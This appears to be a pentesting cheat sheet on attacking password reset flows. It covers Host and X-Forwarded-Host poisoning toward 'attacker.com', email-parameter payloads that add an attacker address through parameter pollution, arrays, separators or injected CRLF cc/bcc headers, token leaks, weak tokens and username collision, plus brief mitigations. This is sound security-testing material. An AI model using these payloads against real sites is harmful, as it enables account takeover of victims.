# Password Reset

# Attacking password reset functions

- Password Reset Token Leak Via Referrer
    1. Request password reset to your email address
    2. Click on the password reset link
    3. Don’t change password
    4. Check for any 3rd party websites (eg: Facebook, twitter)
    5. Intercept the request in Burp Suite proxy
    6. Check if the referer (or maybe even other places) header is leaking password reset token.
- Password Reset Poisoning
    1. Intercept the password reset request in Burp Suite
    2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
        1. Also check other header [Host-Header](Host-Header%203f75f9901e664dafa21815eb0aceb8ee.md) 
        2. Also make sure to change all override headers
    3. Forward the request with the modified header `POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
    4. Look for a password reset URL based on the *host header* like : `https://attacker.com/reset-password.php?token=TOKEN`
- Password Reset Via Email Parameter
    
    ```json
    # parameter pollution
    email=victim@mail.com&email=hacker@mail.com
    
    # array of emails
    {"email":["victim@mail.com","hacker@mail.com"]}
    
    # carbon copy
    email=victim@mail.com%0A%0Dcc:hacker@mail.com
    email=victim@mail.com%0A%0Dbcc:hacker@mail.com
    
    # separator
    email=victim@mail.com,hacker@mail.com
    email=victim@mail.com%20hacker@mail.com
    email=victim@mail.com|hacker@mail.com
    
    # token
    email=victim@gmail.com&code=MyToken
    ```
    
- Weak Password Reset Token
    
    The password reset token should be randomly generated and unique every time. Try to determine if the token expire or if it’s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.
    
    - Timestamp
    - UserID
    - Email of User
    - Firstname and Lastname
    - Date of Birth
    - Cryptography
    - Number only
    - Small token sequence ( characters between [A-Z,a-z,0-9])
    - Token reuse
    - Token expiration date
- Leaking Password Reset Token
    1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
    2. Inspect the server response and check for `resetToken`
    3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`
- Password Reset Via Username Collision
    1. Register on the system with a username identical to the victim’s username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
    2. Request a password reset with your malicious username.
    3. Use the token sent to your email and reset the victim password.
    4. Connect to the victim account with the new password.
- Using Expired Token
    - Testing whether expired tokens can still be used for password reset
    - Mitigation Steps
        - Implement strict token expiration policies and validate token expiry server-side
- Session Invalidation in Logout/Password Reset
    - Ensuring that sessions are invalidated when a user logs out or resets their password
    - Reset tokens should have an expiration time after which they become invalid.
    - Mitigation Steps
        - Implement proper session management, ensuring that all sessions are invalidated upon logout or password reset
        - Set a reasonable expiration time for reset tokens and strictly enforce it server-side

![Untitled](Password%20Reset/Untitled.png)

---

[Reset/Forgotten Password Bypass](https://book.hacktricks.xyz/pentesting-web/reset-password)